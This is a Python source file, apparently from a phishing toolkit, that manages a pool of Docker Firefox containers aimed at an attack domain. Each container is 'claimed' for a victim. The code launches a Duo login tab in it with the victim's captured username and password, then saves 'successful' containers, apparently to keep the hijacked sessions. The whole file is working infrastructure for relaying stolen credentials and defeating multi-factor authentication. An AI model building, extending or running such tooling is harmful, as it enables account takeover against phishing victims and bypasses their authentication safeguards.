import random
import subprocess
import pickle
import time
import os

di = os.path.dirname(__file__)
DOCKER_STARTER_CMD = "{}/sh/launch-backend.sh".format(di)
DOCKER_RM_CMD = "{}/sh/close-backend.sh".format(di)
DOCKER_NEWTAB_CMD = "{}/sh/launch-tab.sh".format(di)
DOCKER_INI = "{}/docker.ini".format(di)

class Manager():
    def __init__(self, attack_dom):
        self.attack_dom = attack_dom
        self.backendPool = {}
        tmp = pickle.load(open(DOCKER_INI,"rb")) 
        self.port = tmp["port"]

        # start initial backends 
        self.idle = 0
        self.MIN_CONTAINERS = 5
        self.STARTUP_TIME = 35
        for _ in range(self.MIN_CONTAINERS):
                self.start_backend()

    def log(self, *args):
        print( "[*] DOCKER_MANAGER\t" + " ".join(map(str,args)))

    # launches a DUO tab in the firefox browser running on docker container bid
    def launch_tab(self, sid, bid, usr, pas):
        cmd = " ".join([DOCKER_NEWTAB_CMD, str(bid), sid, usr, pas])
        self.log("Executing:", cmd)
        cmd = cmd.split(" ")
        self.log("cmd: ", cmd)
        subprocess.Popen(["bash", DOCKER_NEWTAB_CMD, str(bid), sid, usr, pas])

    # Looks for suitable backends, chooses one, claims it for this victim
    # and then tries to launch tab on it. Returns the bid that was cllaimed
    def claim_backend(self, sid, usr, pas):
        
        # the bid to claim
        claimedBid = -1

        # for debugging
        numIdle = 0
        for bid in self.backendPool.keys():
            if self.backendPool[bid]["status"] == "idle": numIdle += 1

        # Find the backend that is idle and has been alive the longest
        longest_alive = [-1, -1]
        for bid in self.backendPool.keys():
            candidate = self.backendPool[bid]
            alive = time.time() - candidate["startTime"] 
            if candidate["status"] == "idle" and alive > longest_alive[0]: 
                longest_alive[0] = alive
                longest_alive[1] = bid

        # If the longest alive backend has been alive for at least the amount
        # deemed necessary to fully startup, claim it
        if longest_alive[0] > self.STARTUP_TIME:
            claimedBid = longest_alive[1]
            self.log("Longest alive backend time:", longest_alive[0], 
                "with bid: ", claimedBid)

        # Debugging
        self.log("available backends: ", self.idle-1, " or ", 
            numIdle-1, "out of", len(self.backendPool.keys()))

        # If the bid was claimed, claim it in the dictionary and launch tab
        if claimedBid != -1:
            self.idle -= 1
            self.backendPool[claimedBid]["status"] = "claimed"
            self.log("backend [bid=",claimedBid,";sid=",sid,"] claimed")
            self.launch_tab(sid, claimedBid, usr, pas)

        # Else, fail and start new container. Victim will try to re-connect
        else:
            self.log("Could not find suitable backend...")
            if self.idle == 0:
                self.log("No containers available, so starting a new one")
                self.start_backend()
                self.log("Trying to claim again...")
                claimedBid = self.claim_backend(sid, usr, pas)
            #time.sleep(5)
            #self.claim_backend(sid, usr, pas)
                
        # If there are fewer idle containers than MIN_CONTAINERS, start a new
        if self.idle <= self.MIN_CONTAINERS:
            self.log("<= ", self.MIN_CONTAINERS, "idle backends... Starting new")
            self.start_backend()

        return claimedBid

    # Releases a backend (sets it from claimed to idle). Does not stop it
    def release_backend(self, bid):
        bid = int(bid)
        if bid in self.backendPool.keys():
            if self.backendPool[bid]["status"] == "claimed":
                self.backendPool[bid]["status"] = "idle"
                self.idle += 1
                self.log("released from SID backend:", bid)
            else:
                self.log("WARNING: Cannot release idle backend: ", bid)
        else:
            self.log("WARNING:", bid, "must have already been released...")

    # Starts a new backend and adds it to the backend dictionary (generates bid) 
    def start_backend(self):
        self.port += 1
        self.backendPool[self.port] = {
            "bid" : self.port,
            "status" : "idle",
            "startTime" : time.time()
        }
        self.idle += 1
        cmd = DOCKER_STARTER_CMD + " " + str(self.port) + " " + str(self.port) + " " + self.attack_dom
        self.log("Executing", cmd)
        self.log("View at: http://localhost:" + str(self.port))
        subprocess.Popen(["bash", DOCKER_STARTER_CMD, str(self.port), str(self.port), self.attack_dom])
        pickle.dump({"port":self.port}, open(DOCKER_INI, "wb"))

    # Stops and saves a successful backend
    def stop_backend(self, bid, name):
        bid = int(bid)
        cmd = "docker stop firefoxSID" + str(bid)
        self.log("Executing:", cmd)
        self.log("Saved successful container: " + str(bid) + " : " + name)

        try:
            if bid in self.backendPool.keys():
                if self.backendPool[bid]["status"] == "idle":
                    self.idle -= 1  
        finally: 
            self.backendPool.pop(bid)
            subprocess.Popen(["docker", "stop", "firefoxSID" + str(bid)])

    # Deletes all currently active backends from disk
    def close_all(self):
        for bid in self.backendPool.keys():
            self.delete_backend(bid)

    # Deletes a backend from disk (given bid) 
    def delete_backend(self, bid):
        cmd = DOCKER_RM_CMD + str(bid)
        self.log("Executing:", cmd)
        subprocess.Popen(["bash", DOCKER_RM_CMD, str(bid)])
